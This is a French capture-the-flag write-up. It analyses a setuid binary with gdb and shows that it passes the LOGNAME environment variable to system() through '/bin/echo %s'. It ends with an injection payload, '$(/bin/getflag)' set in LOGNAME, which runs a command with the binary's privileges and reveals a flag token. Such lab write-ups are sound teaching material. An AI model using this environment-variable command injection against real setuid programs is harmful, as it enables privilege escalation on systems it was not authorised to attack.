   $ ls -la
   ...
   -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

Un binaire dans le home, ok

   $ file level07 
   level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped

On a un binaire 32bits avec les bits setuid et setgid qui sont set et qui utilise des librairies partagées.

   $ ./level07
   level07

Cool.

Inspectons le avec gdb: 

   gdb /tmp/level07 --q --ex "set disassembly-flavor intel" -ex "disass main"

   Dump of assembler code for function main:
      0x08048514 <+0>:     push   ebp
      0x08048515 <+1>:     mov    ebp,esp
      0x08048517 <+3>:     and    esp,0xfffffff0
      0x0804851a <+6>:     sub    esp,0x20
      0x0804851d <+9>:     call   0x80483f0 <getegid@plt>
      0x08048522 <+14>:    mov    DWORD PTR [esp+0x18],eax
      0x08048526 <+18>:    call   0x80483e0 <geteuid@plt>
      0x0804852b <+23>:    mov    DWORD PTR [esp+0x1c],eax
      0x0804852f <+27>:    mov    eax,DWORD PTR [esp+0x18]
      0x08048533 <+31>:    mov    DWORD PTR [esp+0x8],eax
      0x08048537 <+35>:    mov    eax,DWORD PTR [esp+0x18]
      0x0804853b <+39>:    mov    DWORD PTR [esp+0x4],eax
      0x0804853f <+43>:    mov    eax,DWORD PTR [esp+0x18]
      0x08048543 <+47>:    mov    DWORD PTR [esp],eax
      0x08048546 <+50>:    call   0x8048450 <setresgid@plt>
      0x0804854b <+55>:    mov    eax,DWORD PTR [esp+0x1c]
      0x0804854f <+59>:    mov    DWORD PTR [esp+0x8],eax
      0x08048553 <+63>:    mov    eax,DWORD PTR [esp+0x1c]
      0x08048557 <+67>:    mov    DWORD PTR [esp+0x4],eax
      0x0804855b <+71>:    mov    eax,DWORD PTR [esp+0x1c]
      0x0804855f <+75>:    mov    DWORD PTR [esp],eax
      0x08048562 <+78>:    call   0x80483d0 <setresuid@plt>
      0x08048567 <+83>:    mov    DWORD PTR [esp+0x14],0x0
      0x0804856f <+91>:    mov    DWORD PTR [esp],0x8048680
      0x08048576 <+98>:    call   0x8048400 <getenv@plt>
      0x0804857b <+103>:   mov    DWORD PTR [esp+0x8],eax
      0x0804857f <+107>:   mov    DWORD PTR [esp+0x4],0x8048688
      0x08048587 <+115>:   lea    eax,[esp+0x14]
      0x0804858b <+119>:   mov    DWORD PTR [esp],eax
      0x0804858e <+122>:   call   0x8048440 <asprintf@plt>
      0x08048593 <+127>:   mov    eax,DWORD PTR [esp+0x14]
      0x08048597 <+131>:   mov    DWORD PTR [esp],eax
      0x0804859a <+134>:   call   0x8048410 <system@plt>
      0x0804859f <+139>:   leave
      0x080485a0 <+140>:   ret
   End of assembler dump.

Jusqu'à main<+78>, rien de particulièrement intéressant, le programmes set setuid et setgid à nouveau.

Les fonctions getenv(), asprintf(), et system() nous intéressent, system() va à priori être la source de
vulnérabilité si on peut contrôler la mémoire que cette fonction va lire.

À main<+91>, on voit qu'un argument est placé sur la stack dans le but d'appeler getenv(3)
D'après man 3 getenv, il existe une fonction secure_getenv, ce qui laisse pas que getenv est la source de vulnérabilités
Allons voir cet argument avec x/s qui va imprimer la mémoire à un emplacement donné sous forme
de string càd tout ce qu'il ya jusqu'à un \0 dans la mémoire... ou jusqu'à segfault lol

(gdb) x/s 0x8048680
0x8048680:	 "LOGNAME"

Essayons de voir ce qui se passe si on set LOGNAME

   $ LOGNAME=coucou ./level07
   coucou

Ok donc la variable d'environnement LOGNAME est une source d'injection et le programme semble juste imprimer $LOGNAME
Cependant, il n'y pas de write ou de printf.
Et non, asprintf n'imprime pas sur la sortie standard !

Voyons maintenant les arguments de asprintf :

(gdb) x/s 0x8048688
0x8048688:	 "/bin/echo %s "

On a la format string de asprintf() et on comprend que le programme fait en fait un echo de la $LOGNAME grâce a la fonction system(3)
ce qui est particulièrement unsafe vu qu'elle éxécute un shell, et donc peut éxécuter du code shell !
Si on modifie la variable d'environnement LOGNAME

   $ LOGNAME='$(/bin/getflag)' ./level07 

   Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

Bingo.
